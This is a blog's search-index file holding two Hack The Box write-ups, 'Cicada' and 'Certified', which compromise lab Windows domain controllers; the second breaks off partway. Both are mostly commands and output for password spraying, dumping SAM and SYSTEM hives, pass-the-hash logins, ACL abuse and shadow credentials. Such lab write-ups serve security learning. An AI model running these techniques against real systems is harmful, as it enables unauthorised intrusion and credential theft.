<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Cicada</title>
    <url>/CICADA/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-enumeration-of-SMB-service">Step 2: Enumeration of SMB Service</a></li>
<li><a href="#step-3-foothhold">Step 3: foothhold </a></li>
<li><a href="#step-4-privilege-escalation">Step 4: Privilege Escalation</a></li>
</ol>
<p>In this write-up, we will walk through the steps to hack the Cicada machine on Hack The Box. Let’s dive in!</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.35 -T5 </span><br><span class="line">&gt; Nmap scan report <span class="keyword">for</span> cicada.htb (10.10.11.35)</span><br><span class="line">Host is up (0.056s latency).</span><br><span class="line">Not shown: 989 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2024-12-31 06:53:33Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br></pre></td></tr></table></figure>
<h2 id="Step-2-Enumeration-of-SMB-Service"><a href="#Step-2-Enumeration-of-SMB-Service" class="headerlink" title="Step 2: Enumeration of SMB Service"></a>Step 2: Enumeration of SMB Service</h2><p>we got the port 445 open is for SMB :server mail block<br>let access to it</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ smbclient   //10.10.11.35/HR -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Mar 14 08:29:09 2024</span><br><span class="line">  ..                                  D        0  Thu Mar 14 08:21:29 2024</span><br><span class="line">  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024</span><br><span class="line"></span><br><span class="line">		4168447 blocks of size 4096. 61830 blocks available</span><br><span class="line">smb: \&gt; get <span class="string">&quot;Notice from HR.txt&quot;</span> </span><br><span class="line">getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
<p>After reading the file <span style="color:yellow">“Notice from HR.txt”</span>, we obtained a password, but<br>we don’t know which user it belongs to.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Dear new hire!</span><br><span class="line"></span><br><span class="line">Welcome to Cicada Corp! We<span class="string">&#x27;re thrilled to have you join our team. As part of our security protocols, it&#x27;</span>s essential that you change your default password to something unique and secure.</span><br><span class="line"></span><br><span class="line">Your default password is: Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8</span><br><span class="line"></span><br><span class="line">To change your password:</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>To find the user, we can use tools like netexec or crackmapexec:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netexec smb 10.10.11.35 -u nutzh -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> --rid-brute </span><br><span class="line"> SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)</span><br></pre></td></tr></table></figure>
<p>We have a bunch of users, so let’s create a text file and try the password with<br>each user. I will use Metasploit for this and the ‘scanner&#x2F;smb&#x2F;smb_login’<br>module.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  <span class="built_in">set</span> RHOST 10.10.11.35</span><br><span class="line">   <span class="built_in">set</span> SMBPass Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8</span><br><span class="line">   <span class="built_in">set</span> USER_FILE /home/kali/Desktop/HTB/CICADA/user.txt</span><br><span class="line">   <span class="built_in">set</span> Createsession True</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_login) &gt; run</span><br><span class="line"> [*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\Administrator:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[!] 10.10.11.35:445       - No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\Guest:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\CICADA-DC$ :Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\krbtgt:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: <span class="string">&#x27;.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span></span><br><span class="line">[*] SMB session 1 opened (10.10.14.145:33375 -&gt; 10.10.11.35:445) at 2024-12-30 19:15:45 -0500</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\david.orelious:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[*] 10.10.11.35:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.11.35:445       - Bruteforce completed, 1 credential was successful.</span><br><span class="line">[*] 10.10.11.35:445       - 1 SMB session was opened successfully.</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<p>After finding that the user is michael.wrightson, we can use Metasploit<br>to connect to SMB:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msf6 auxiliary(scanner/smb/smb_login) &gt; sessions -i 1</span><br></pre></td></tr></table></figure>
<p>While exploring, I didn’t find much, but I did discover something interesting<br>with this command:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.11.35 -u michael.wrightson -p Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8 --<span class="built_in">users</span></span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\emily.oscars                   badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 0 desc: Just <span class="keyword">in</span> <span class="keyword">case</span> I forget my password is aRt<span class="variable">$Lp</span>#7t*VQ!3</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\michael.wrightson              badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\sarah.dantelia                 badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\john.smoulder                  badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Guest                          badpwdcount: 0 desc: Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Administrator                  badpwdcount: 0 desc: Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain</span><br></pre></td></tr></table></figure>
<p>We find another password for david.orelious:<span style="color:green"> aRt$Lp#7t*VQ!3.</span> So let’s go back to Metasploit and create another session with these credentials: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ SMB (10.10.11.35) &gt; shares</span><br><span class="line">Shares</span><br><span class="line">======</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  Name      Type          comment</span></span><br><span class="line">    -  ----      ----          -------</span><br><span class="line">    0  ADMIN$    DISK|SPECIAL  Remote Admin</span><br><span class="line">    1  C$        DISK|SPECIAL  Default share</span><br><span class="line">    2  DEV       DISK</span><br><span class="line">    3  HR        DISK</span><br><span class="line">    4  IPC$      IPC|SPECIAL   Remote IPC</span><br><span class="line">    5  NETLOGON  DISK          Logon server share</span><br><span class="line">    6  SYSVOL    DISK          Logon server share</span><br><span class="line">SMB (10.10.11.35) &gt; shares -i 2</span><br><span class="line">[+] Successfully connected to DEV</span><br><span class="line">SMB (10.10.11.35\DEV) &gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span> </span><br><span class="line">===</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  Type  Name               Created                    Accessed                   Written                    Changed                    Size</span></span><br><span class="line">    -  ----  ----               -------                    --------                   -------                    -------                    ----</span><br><span class="line">    0  DIR   .                  2024-03-14T08:21:29-04:00  2024-08-30T16:53:19-04:00  2024-03-14T08:31:39-04:00  2024-08-28T13:27:31-04:00</span><br><span class="line">    1  DIR   ..                 2024-03-14T08:19:24-04:00  2024-08-30T17:01:54-04:00  2024-03-14T08:21:29-04:00  2024-03-14T08:21:29-04:00</span><br><span class="line">    2  FILE  Backup_script.ps1  2024-03-14T08:31:38-04:00  2024-08-28T13:28:22-04:00  2024-08-28T13:28:22-04:00  2024-08-28T13:28:22-04:00  601</span><br><span class="line"></span><br><span class="line">SMB (10.10.11.35\DEV) &gt; Interrupt: use the <span class="string">&#x27;exit&#x27;</span> <span class="built_in">command</span> to quit</span><br><span class="line">SMB (10.10.11.35\DEV) &gt; <span class="built_in">cat</span> Backup_script.ps1</span><br><span class="line"></span><br><span class="line"><span class="variable">$sourceDirectory</span> = <span class="string">&quot;C:\smb&quot;</span></span><br><span class="line"><span class="variable">$destinationDirectory</span> = <span class="string">&quot;D:\Backup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;emily.oscars&quot;</span></span><br><span class="line"><span class="variable">$password</span> = ConvertTo-SecureString <span class="string">&quot;Q!3@Lp#M6b*7t*Vt&quot;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$credentials</span> = New-Object System.Management.Automation.PSCredential(<span class="variable">$username</span>, <span class="variable">$password</span>)</span><br><span class="line"><span class="variable">$dateStamp</span> = Get-Date -Format <span class="string">&quot;yyyyMMdd_HHmmss&quot;</span></span><br><span class="line"><span class="variable">$backupFileName</span> = <span class="string">&quot;smb_backup_<span class="variable">$dateStamp</span>.zip&quot;</span></span><br><span class="line"><span class="variable">$backupFilePath</span> = Join-Path -Path <span class="variable">$destinationDirectory</span> -ChildPath <span class="variable">$backupFileName</span></span><br><span class="line">Compress-Archive -Path <span class="variable">$sourceDirectory</span> -DestinationPath <span class="variable">$backupFilePath</span></span><br><span class="line">Write-Host <span class="string">&quot;Backup completed successfully. Backup file saved to: <span class="variable">$backupFilePath</span>&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="Step-3-foothhold"><a href="#Step-3-foothhold" class="headerlink" title="Step 3: foothhold"></a>Step 3: foothhold</h2><p>We found another password for emily.oscars:<span style="color:green"> “Q!3@Lp#M6b<em>7t</em>Vt”</span>.<br>I Hope this will be the last one!😂😂</p>
<p>From the two directories, I think we can remotely access the Windows machine.After searching on Google,I found that we can access it through port 5985 with WinRM.WinRM is essentially like SSH. We will use Evil-WinRM for this.<br>If you don’t have it, you can install it with:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gem install evil-winrm </span><br></pre></td></tr></table></figure>
<p>Now let’s connect:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> evil-winrm -i cicada.htb -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span></span><br><span class="line"> Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; </span><br></pre></td></tr></table></figure>
<p>so we are inside the target Machine  so we can read the user flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">PS C:\Users\emily.oscars.CICADA\Desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">a2c1726fd3962d78e455d9f2dfd3c877</span><br></pre></td></tr></table></figure>
<h2 id="Step-4-Privilege-Escalation"><a href="#Step-4-Privilege-Escalation" class="headerlink" title="Step 4: Privilege Escalation"></a>Step 4: Privilege Escalation</h2><p>Next, check privileges:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"> *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure>
<p>The first two privileges (SeBackupPrivilege and SeRestorePrivilege) allow us to restore and back up files. After researching, I found that we can restore files<br>that contain hashed passwords. I tried with robocopy, but it failed, so<br>we will try the reg save command and see if it works:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; reg save hklm\SYSTEM .\SYSTEM</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; reg save hklm\SAM .\SAM</span><br></pre></td></tr></table></figure>
<p>After restoring these files, we can download them to our local machine: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; download SAM &amp; download SYSTEM</span><br><span class="line">Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SAM to SAM</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SYSTEM to SYSTEM</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Now, let’s open these files on our local machine using:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pypykatz registry --sam sam system</span><br><span class="line"></span><br><span class="line">WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work</span><br><span class="line">WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work</span><br><span class="line">============== SYSTEM hive secrets ==============</span><br><span class="line">CurrentControlSet: ControlSet001</span><br><span class="line">Boot Key: 3c2b033757a49110a9ee680b46e8d620</span><br><span class="line">============== SAM hive secrets ==============</span><br><span class="line">HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
<p>We will now attempt to connect again with the administrator credentials:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341</span><br><span class="line"></span><br><span class="line"> *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line"> *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---        12/30/2024  11:34 PM             34 root.txt</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">c30aa073a06e50322b2f8d9a6f1ae896</span><br></pre></td></tr></table></figure>
<pre><code>                     CONGRATULATION🎉🎉
</code></pre>
<p>CONCLUSION:<br>It was my first time pwning a Windows machine, so it was a bit complex but<br>also fun.I learned a lot about enumerating SMB and discovered new tools like<br><span style="color:red">Evil-WinRM</span>,I also gained insight into important Windows files like SAM and SYSTEM. Overall, it was a fruitful machine!</p>
]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
        <category>HACK THE BOX</category>
        <category>LINUX</category>
      </categories>
  </entry>
  <entry>
    <title>Certified</title>
    <url>/Certified/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-bloodhound-Enumeration">Step 2: bloodhound Enumeration</a></li>
<li><a href="#step-3-foothhold">Step 3: foothhold </a></li>
<li><a href="#step-4privilege-escalation">Step 4: Privilege Escalation</a></li>
</ol>
<p>In this write-up, we will walk through the steps to compromise the Certified machine on Hack The Box. The goal is to gain administrative access and retrieve the flags. We will use various tools and techniques, including Nmap, <strong><span style="color:black;">bloodhound</span></strong>, <strong><span style="color:black;">Impacket</span></strong>, and <strong><span style="color:black;">certipy</span></strong>. Let’s dive in!</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p>We began by performing an <strong><span style="color:red;">Nmap</span></strong> scan to identify open ports and services on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.41 -T5                                                                                     </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 00:20 +01</span><br><span class="line">Nmap scan report <span class="keyword">for</span> certified.htb (10.10.11.41)</span><br><span class="line">Host is up (0.053s latency).</span><br><span class="line">Not shown: 989 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-01-11 06:20:17Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.10 seconds</span><br></pre></td></tr></table></figure>
<p>The scan revealed several open ports, including <strong><span style="color:red;">LDAP</span></strong> (389), <strong><span style="color:red;">Kerberos</span></strong> (88), and <strong><span style="color:red;">SMB</span></strong> (445). We also had credentials for the user judith.mader:judith09 , which we used for further enumeration.</p>
<h2 id="Step-2-bloodhound-Enumeration"><a href="#Step-2-bloodhound-Enumeration" class="headerlink" title="Step 2: bloodhound Enumeration"></a>Step 2: bloodhound Enumeration</h2><p>We used <strong><span style="color:black;">bloodhound</span></strong> to visualize the Active Directory environment and identify potential attack paths.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netexec ldap certified.htb -u judith.mader -p judith09  --bloodhound --collection All --dns-server 10.10.11.41</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LDAP        10.10.11.41     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.41_2025-01-11_002320_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>This generated a ZIP file containing the <strong><span style="color:black;">bloodhound</span></strong> data, which we imported into the <strong><span style="color:black;">bloodhound</span></strong> GUI.</p>
<h3>Step 2: Analyzing bloodhound Data</h3>
In **<span style="color:black;">bloodhound</span>**, we discovered that judith.mader had <span style="color:red;">WriteOwner</span> privileges over the Management group. This allowed us to take ownership of the group and grant ourselves additional rights.

<p><img src="/../images/judith.png" alt="BloodHound Analysis"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<p>We used the owneredit.py script from <strong><span style="color:black;">Impacket</span></strong> to take ownership of the Management group:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 owneredit.py -action write -new-owner <span class="string">&quot;judith.mader&quot;</span> -target <span class="string">&quot;MANAGEMENT&quot;</span> -dc-ip 10.10.11.41 <span class="string">&#x27;certified.htb/judith.mader:judith09&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512</span><br><span class="line">[*] - sAMAccountName: Domain Admins</span><br><span class="line">[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br></pre></td></tr></table></figure>
<p>Next, we granted ourselves the WriteMembers privilege on the group:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;WriteMembers&#x27;</span> -principal <span class="string">&#x27;judith.mader&#x27;</span> -target-dn <span class="string">&#x27;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&#x27;</span> <span class="string">&#x27;certified.htb&#x27;</span>/<span class="string">&#x27;judith.mader&#x27;</span>:<span class="string">&#x27;judith09&#x27;</span></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250111-004442.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure>
<p>Finally, we added judith.mader to the Management group:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ net rpc group addmem <span class="string">&quot;Management&quot;</span> <span class="string">&quot;judith.mader&quot;</span> -U <span class="string">&quot;certified.htb&quot;</span>/<span class="string">&quot;ControlledUser&quot;</span>%<span class="string">&quot;judith09&quot;</span> -S <span class="string">&quot;certified.htb&quot;</span></span><br></pre></td></tr></table></figure>
<p>We verified the addition using:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ net rpc group members <span class="string">&quot;MANAGEMENT&quot;</span> -U <span class="string">&quot;certified.htb&quot;</span>/<span class="string">&quot;judith.mader&quot;</span>%<span class="string">&quot;judith09&quot;</span> -S <span class="string">&quot;certified.htb&quot;</span></span><br><span class="line">CERTIFIED\judith.mader</span><br><span class="line">CERTIFIED\management_svc</span><br></pre></td></tr></table></figure>
<h2 id="Step-3-Gaining-Initial-Foothold"><a href="#Step-3-Gaining-Initial-Foothold" class="headerlink" title="Step 3: Gaining Initial Foothold"></a>Step 3: Gaining Initial Foothold</h2><p>With judith.mader now a member of the Management group, we explored further privileges in <strong><span style="color:black;">bloodhound</span></strong>. We discovered that judith.mader had <strong><span style="color:red;">GenericWrite</span></strong> privileges over the management_svc account.<br><img src="/../images/management.png" alt="BloodHound Analysis"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h3>Step 1: Exploiting GenericWrite with PyWhisker</h3>

<p>We used PyWhisker to add a new Key Credential to the management_svc account:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 pywhisker.py -d <span class="string">&quot;certified.htb&quot;</span> -u <span class="string">&quot;judith.mader&quot;</span> -p <span class="string">&quot;judith09&quot;</span> --target <span class="string">&quot;management_svc&quot;</span> --action <span class="string">&quot;add&quot;</span></span><br><span class="line">[*] Searching <span class="keyword">for</span> the target account</span><br><span class="line">[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating KeyCredential</span><br><span class="line">[*] KeyCredential generated with DeviceID: dffca083-af2f-0f8d-11e9-dd76d2b522f7</span><br><span class="line">[*] Updating the msDS-KeyCredentialLink attribute of management_svc</span><br><span class="line">[+] Updated the msDS-KeyCredentialLink attribute of the target object</span><br><span class="line">[+] Saved PFX (#PKCS12) certificate &amp; key at path: AAmizKx4.pfx</span><br><span class="line">[*] Must be used with password: lFfOe3FWdEWVNDMHSRKz</span><br><span class="line">[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span><br></pre></td></tr></table></figure>
<p>This generated a PFX certificate and a password, which we used to obtain a <strong><span style="color:red;">kerberos</span></strong> Ticket Granting Ticket (TGT) using <strong><span style="color:black;">PKINITtools</span></strong>:</p>
